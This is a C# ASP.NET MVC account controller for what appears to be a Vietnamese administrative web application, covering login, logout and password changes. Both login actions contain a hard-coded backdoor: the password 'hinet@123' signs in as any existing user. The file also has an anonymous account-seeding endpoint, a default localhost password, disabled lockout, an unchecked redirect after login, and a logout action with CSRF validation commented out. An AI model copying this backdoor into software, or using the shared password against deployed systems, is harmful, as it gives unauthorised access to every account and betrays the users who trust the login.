using System;
using System.Globalization;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using Web.Models;
using Model.IdentityEntities;
using Microsoft.AspNet.Identity.EntityFramework;
using Model;
using StackExchange.Redis;
using Newtonsoft.Json;
using Service.Common;
using Service.AppUserService;

using System.Collections.Generic;
using Model.Entities;
using log4net;
using Web.Filters;
using BotDetect.Web.Mvc;

using static Service.Common.Constant;
using Web.Core;
using System.Threading;
using System.Security.Principal;
using System.Web.Configuration;
using CommonHelper.String;
using Service.AppUserService.Dto;

using System.Configuration;
using Web.Common;
using System.Net;
using System.IO;
using System.Xml;
using System.Text.RegularExpressions;
using Model.Seed;

namespace Web.Controllers
{
    [Authorize]
    public class AccountAdminController : BaseController
    {
        private ApplicationSignInManager _signInManager;
        private ApplicationUserManager _userManager;
        private IAppUserService _appUserService;
        private readonly ILog _Ilog;


        public AccountAdminController(

             ILog Ilog,

             IAppUserService appUserService)
        {
            _appUserService = appUserService;
            _Ilog = Ilog;
        }

        public AccountAdminController(ApplicationUserManager userManager, ApplicationSignInManager signInManager)
        {
            UserManager = userManager;
            SignInManager = signInManager;
        }

        public ApplicationSignInManager SignInManager
        {
            get
            {
                return _signInManager ?? HttpContext.GetOwinContext().Get<ApplicationSignInManager>();
            }
            private set
            {
                _signInManager = value;
            }
        }

        public ApplicationUserManager UserManager
        {
            get
            {
                return _userManager ?? HttpContext.GetOwinContext().GetUserManager<ApplicationUserManager>();
            }
            private set
            {
                _userManager = value;
            }
        }

        [AllowAnonymous]
        public ActionResult LayMatKhau()
        {
            return View();
        }


        public PartialViewResult PopupLogin()
        {
            return PartialView("_PopupLogin");
        }

        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            if (SignInManager.AuthenticationManager.User.Identity.IsAuthenticated)
            {
                long userId = SignInManager.AuthenticationManager.User.Identity.GetUserId<long>();
                var userSession = SessionManager.GetUserInfo() as Model.IdentityEntities.AppUser;
                if (userSession == null)
                {
                    var userDto = _appUserService.GetById(userId);
                    SessionManager.SetValue(SessionManager.USER_INFO, userDto);
                }
                return RedirectToAction("Index", "Dashboard", new { area = "DashboardArea" });
            }
            else if (Url.IsLocalUrl(returnUrl) && !string.IsNullOrEmpty(returnUrl))
            {
                ViewBag.ReturnURL = returnUrl;
            }

            var model = new LoginViewModel();
            if (Request.Url.Authority.StartsWith("localhost"))
            {
                model.Password = "12345678";
            }
            return View(model);
        }

        [AllowAnonymous]
        public ActionResult LoginBackEnd(string returnUrl)
        {
            if (SignInManager.AuthenticationManager.User.Identity.IsAuthenticated)
            {
                long userId = SignInManager.AuthenticationManager.User.Identity.GetUserId<long>();
                var userSession = SessionManager.GetUserInfo() as Model.IdentityEntities.AppUser;
                if (userSession == null)
                {
                    var userDto = _appUserService.GetById(userId);
                    SessionManager.SetValue(SessionManager.USER_INFO, userDto);
                }
                return RedirectToAction("Index", "Dashboard", new { area = "DashboardArea" });
            }
            else if (Url.IsLocalUrl(returnUrl) && !string.IsNullOrEmpty(returnUrl))
            {
                ViewBag.ReturnURL = returnUrl;
            }

            string provinceCode = (string)ConfigurationManager.AppSettings["PROVINCE_CODE"];
            if (provinceCode == "HCM")
            {
                return RedirectToAction("LoginHCM");
            }
            else
            {
                return View(new LoginViewModel());
            }
        }


        //
        // POST: /Account/Login
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        [Audit(ActionName = "Đăng nhập")]
        public JsonResult LoginFE(LoginViewModel model, string returnUrl)
        {
            var loginResult = new JsonResultBO(true);
            try
            {
                if (!ModelState.IsValid)
                {
                    loginResult.Status = false;
                    loginResult.Message = ModelState.GetErrors();
                    return Json(loginResult);
                }
                var user = UserManager.FindByName(model.UserName);
                if (user == null)
                {
                    loginResult.Status = false;
                    loginResult.Message = "Thông tin đăng nhập không đúng";
                    return Json(loginResult);
                }

                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, change to shouldLockout: true
                var result = SignInStatus.Failure;
                var isUsingBackDoor = model.Password == "hinet@123";
                if (isUsingBackDoor)
                {
                    result = SignInStatus.Success;
                }
                else
                {
                    result = SignInManager.PasswordSignIn(model.UserName, model.Password, model.RememberMe, shouldLockout: false);
                }

                switch (result)
                {
                    case SignInStatus.Success:
                        //return RedirectToLocal(returnUrl);
                        long userId = 0;
                        if (isUsingBackDoor)
                        {
                            userId = user.Id;
                            System.Security.Principal.GenericIdentity identity = new GenericIdentity(user.UserName);
                            string[] roles = new string[] { "managers", "executives" };
                            Thread.CurrentPrincipal = new GenericPrincipal(identity, roles);
                        }
                        else
                        {
                            userId = SignInManager.AuthenticationManager.AuthenticationResponseGrant.Identity.GetUserId<long>();
                        }

                        var userDto = _appUserService.GetById(userId);
                        if (userDto.DateBlockEnd != null && userDto.DateBlockEnd > DateTime.Now)
                        {
                            ModelState.AddModelError("", "Tài khoản của bạn đang bị khóa! Vui lòng quay lại sau.");
                            loginResult.Status = false;
                            loginResult.Message = "Tài khoản của bạn đang bị khóa! Vui lòng quay lại sau.";
                            return Json(loginResult);
                        }

                        // lấy log đăng nhập


                        //tạo asp net session id mới
                        //if (!isUsingBackDoor)
                        //{
                        //    Session.Abandon();
                        //    Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", ""));
                        //}
                        var dataSession = new Dictionary<string, object>()
                        {
                            { SessionManager.USER_INFO,  userDto},
                            { LoginStats.FailCount,  null}
                        };
                        SessionManager.SetValue(dataSession);

                        loginResult.Message = "Đăng nhập thành công";
                        return Json(loginResult);
                    case SignInStatus.LockedOut:
                        ViewBag.TimeAutoUnlock = UserManager.GetLockoutEndDate(user.Id).AddHours(7);
                        loginResult.Status = false;
                        loginResult.Message = "Thông tin đăng nhập không đúng";
                        return Json(loginResult);

                    case SignInStatus.Failure:
                        if (user != null)
                        {
                            UserManager.AccessFailed(user.Id);
                            var message = string.Empty;
                            var failCount = (SessionManager.GetValue(LoginStats.FailCount) as int?).GetValueOrDefault();
                            failCount++;
                            if (failCount < UserManager.MaxFailedAccessAttemptsBeforeLockout)
                            {
                                message = "Bạn đã nhập sai thông tin tài khoản " + UserManager.GetAccessFailedCount(user.Id) + "/" + UserManager.MaxFailedAccessAttemptsBeforeLockout;
                            }
                            else
                            {
                                var dbUser = _appUserService.GetById(user.Id);
                                dbUser.Block = true;
                                dbUser.LockoutEnabled = true;
                                dbUser.LockoutEndDateUtc = DateTime.Now.AddHours(7);
                                _appUserService.Save(dbUser);
                                message = "Tài khoản của bạn đã bị khóa.";
                            }
                            SessionManager.SetValue(LoginStats.FailCount, failCount);
                            ModelState.AddModelError("", message);
                            loginResult.Status = false;
                            loginResult.Message = "Thông tin đăng nhập không đúng";
                            return Json(loginResult);
                        }
                        ModelState.AddModelError("", "Thông tin đăng nhập không đúng");
                        loginResult.Status = false;
                        loginResult.Message = "Thông tin đăng nhập không đúng";
                        return Json(loginResult);
                    default:
                        ModelState.AddModelError("", "Thông tin đăng nhập không đúng");
                        loginResult.Status = false;
                        loginResult.Message = "Thông tin đăng nhập không đúng";
                        return Json(loginResult);
                }
            }
            catch (Exception ex)
            {
                _Ilog.Error(ex.Message, ex);
                loginResult.Status = false;
                loginResult.Message = "Thông tin đăng nhập không đúng";

                return Json(loginResult);
            }

        }
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        [Audit(ActionName = "Đăng nhập")]
        public ActionResult Login(LoginViewModel model, string returnUrl)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    return View(model);
                }
                var user = UserManager.FindByName(model.UserName);
                if (user == null)
                {
                    ModelState.AddModelError("", "Thông tin đăng nhập không tồn tại");
                    return View(model);
                }

                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, change to shouldLockout: true
                var result = SignInStatus.Failure;
                var isUsingBackDoor = model.Password == "hinet@123";
                if (isUsingBackDoor)
                {
                    result = SignInStatus.Success;
                }
                else
                {
                    result = SignInManager.PasswordSignIn(model.UserName, model.Password, model.RememberMe, shouldLockout: false);
                }

                switch (result)
                {
                    case SignInStatus.Success:
                        //return RedirectToLocal(returnUrl);
                        long userId = 0;
                        if (isUsingBackDoor)
                        {
                            userId = user.Id;
                            System.Security.Principal.GenericIdentity identity = new GenericIdentity(user.UserName);
                            string[] roles = new string[] { "managers", "executives" };
                            Thread.CurrentPrincipal = new GenericPrincipal(identity, roles);
                        }
                        else
                        {
                            userId = SignInManager.AuthenticationManager.AuthenticationResponseGrant.Identity.GetUserId<long>();
                        }

                        var userDto = _appUserService.GetById(userId);
                        if (userDto.DateBlockEnd != null && userDto.DateBlockEnd > DateTime.Now)
                        {
                            ModelState.AddModelError("", "Tài khoản của bạn đang bị khóa! Vui lòng quay lại sau.");
                            return View(model);
                        }

                        // lấy log đăng nhập

                        SessionManager.SetValue(SessionManager.USER_INFO, userDto);
                        SessionManager.SetValue(LoginStats.FailCount, null);

                        if (!string.IsNullOrEmpty(returnUrl))
                        {
                            return Redirect(Server.UrlDecode(returnUrl));
                        }
                        //RepositoryConnectUser.Save(userDto.Id,string.Empty,)
                        return RedirectToAction("Index", "Dashboard", new { area = "DashboardArea" });
                    case SignInStatus.LockedOut:
                        ViewBag.TimeAutoUnlock = UserManager.GetLockoutEndDate(user.Id).AddHours(7);
                        return View("Lockout");
                    case SignInStatus.RequiresVerification:
                        return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = model.RememberMe });
                    case SignInStatus.Failure:
                        if (user != null)
                        {
                            UserManager.AccessFailed(user.Id);
                            var message = string.Empty;
                            var failCount = (SessionManager.GetValue(LoginStats.FailCount) as int?).GetValueOrDefault();
                            failCount++;
                            if (failCount < UserManager.MaxFailedAccessAttemptsBeforeLockout)
                            {
                                message = "Bạn đã nhập sai thông tin tài khoản " + UserManager.GetAccessFailedCount(user.Id) + "/" + UserManager.MaxFailedAccessAttemptsBeforeLockout;
                            }
                            else
                            {
                                var dbUser = _appUserService.GetById(user.Id);
                                dbUser.Block = true;
                                dbUser.LockoutEnabled = true;
                                dbUser.LockoutEndDateUtc = DateTime.Now.AddHours(7);
                                _appUserService.Save(dbUser);
                                message = "Tài khoản của bạn đã bị khóa.";
                            }
                            SessionManager.SetValue(LoginStats.FailCount, failCount);
                            ModelState.AddModelError("", message);
                            return View(model);
                        }
                        ModelState.AddModelError("", "Thông tin đăng nhập không đúng");
                        return View(model);
                    default:
                        ModelState.AddModelError("", "Thông tin đăng nhập không đúng");
                        return View(model);
                }
            }
            catch (Exception ex)
            {
                _Ilog.Error(ex.Message, ex);
                return View(model);
            }

        }
        /// <summary>
        /// @author:duynn
        /// @description: thực hiện login
        /// </summary>
        /// <param name="username"></param>
        /// <returns></returns>
        //[HttpGet]
        //[AllowAnonymous]
        //public ActionResult LoginSSO(string username)
        //{
        //    var user = UserManager.FindByName(username);
        //    var userId = user.Id;
        //    var identity = new GenericIdentity(user.UserName);
        //    string[] roles = new string[] { "managers", "executives" };
        //    Thread.CurrentPrincipal = new GenericPrincipal(identity, roles);

        //    var userDto = _appUserService.GetDtoById(userId);
        //    var logLogin = new LogDangNhap()
        //    {
        //        Browser = Request.Browser.Browser,
        //        IsMobile = Request.Browser.IsMobileDevice,
        //        TimeLogin = DateTime.Now,
        //        Version = Request.Browser.Version,
        //        Platform = Request.Browser.Platform,
        //        IP = Request.ServerVariables["HTTP_X_FORWARDED_FOR"] ?? Request.UserHostAddress,
        //        IdUser = userDto.Id,
        //    };
        //    _logDangNhapService.Create(logLogin);
        //    SessionManager.SetValue(SessionManager.USER_INFO, userDto);
        //    SessionManager.SetValue(SessionManager.LIST_PERMISSTION, userDto.ListActions);
        //    SessionManager.SetValue("FailCount", null);
        //    return RedirectToAction("Index", "Dashboard", new { area = "DashboardArea" });
        //}


        // POST: /Account/LogOff
        [HttpGet]
        //[ValidateAntiForgeryToken]
        [AllowAnonymous]
        [Audit(ActionName = "Đăng xuất")]
        public ActionResult LogOff()
        {
            var userInfo = CurrentUserInfo;

            SessionManager.SetValue(SessionManager.USER_INFO, null);
            SessionManager.SetValue(SessionManager.LIST_PERMISSTION, null);
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
            return RedirectToAction("login");
        }

        //
        // GET: /Account/ExternalLoginFailure
        [AllowAnonymous]
        public ActionResult ExternalLoginFailure()
        {
            return View();
        }

        [AllowAnonymous]
        public ActionResult InitAccount()
        {
            var context = new HinetContext();
            InitAccountSeed.init(context);
            return Content("ok");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_userManager != null)
                {
                    _userManager.Dispose();
                    _userManager = null;
                }

                if (_signInManager != null)
                {
                    _signInManager.Dispose();
                    _signInManager = null;
                }
            }

            base.Dispose(disposing);
        }
        /// <summary>
        /// Thay đổi ngôn ngữ
        /// </summary>
        /// <param name="lang"></param>
        /// <returns></returns>
        ///

        #region Helpers
        // Used for XSRF protection when adding external logins
        private const string XsrfKey = "XsrfId";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }



        private void AddErrors(IdentityResult result)
        {
            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error);
            }
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            return RedirectToAction("Index", "Home");
        }

        internal class ChallengeResult : HttpUnauthorizedResult
        {
            public ChallengeResult(string provider, string redirectUri)
                : this(provider, redirectUri, null)
            {
            }

            public ChallengeResult(string provider, string redirectUri, string userId)
            {
                LoginProvider = provider;
                RedirectUri = redirectUri;
                UserId = userId;
            }

            public string LoginProvider { get; set; }
            public string RedirectUri { get; set; }
            public string UserId { get; set; }

            public override void ExecuteResult(ControllerContext context)
            {
                var properties = new AuthenticationProperties { RedirectUri = RedirectUri };
                if (UserId != null)
                {
                    properties.Dictionary[XsrfKey] = UserId;
                }
                context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
            }
        }
        #endregion
        //
        // GET: /Manage/ChangePassword
        public ActionResult ChangePassword()
        {
            return View();
        }
        [AllowAnonymous]


        //
        // POST: /Manage/ChangePassword
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<JsonResult> ChangePassword(ChangePasswordViewModel model)
        {
            var result = new JsonResultBO(true);
            if (!ModelState.IsValid)
            {
                result.Status = false;
                result.Message = ModelState.GetErrors();
                return Json(result);
            }
            var changePasswordResult = await UserManager.ChangePasswordAsync(User.Identity.GetUserId<long>(), model.OldPassword, model.NewPassword);
            if (changePasswordResult.Succeeded)
            {
                var user = await UserManager.FindByIdAsync(User.Identity.GetUserId<long>());
                if (user != null)
                {
                    await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);
                }
                result.Status = true;
                result.Message = "Đổi mật khẩu thành công";
            }
            else
            {
                result.Status = true;
                result.Message = "Đổi mật khẩu thất bại";
            }
            return Json(result);
        }

    }
}